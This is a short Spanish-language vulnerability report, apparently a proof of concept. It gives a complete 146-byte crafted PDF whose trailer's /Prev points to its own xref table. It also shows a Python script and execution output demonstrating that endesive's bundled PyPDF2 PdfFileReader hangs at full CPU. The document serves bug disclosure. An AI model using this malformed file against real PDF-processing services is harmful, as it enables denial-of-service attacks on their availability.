PDF de 146 bytes — el trailer de su única tabla
xref tiene `/Prev` apuntando al offset donde empieza la propia palabra "xref" de esa misma
tabla:

```
%PDF-1.4
1 0 obj<</Type/Catalog>>endobj
xref
0 2
0000000000 65535 f
0000000009 00000 n
trailer<</Size 2/Root 1 0 R/Prev 40>>
startxref
40
%%EOF
```

Script:
```python
from endesive.pdf.PyPDF2.pdf import PdfFileReader
r = PdfFileReader('loop.pdf')
print('returned normally (no hang)')
```

Ejecución real:
```
$ timeout 8 python3 poc.py
$ echo "exit code: $?"
exit code: 124
```

`timeout` mató el proceso a los 8 segundos — nunca llegó a imprimir el mensaje ni a lanzar
ninguna excepción. Solo construir `PdfFileReader` sobre este archivo ya deja el proceso
consumiendo CPU al 100% sin parar.
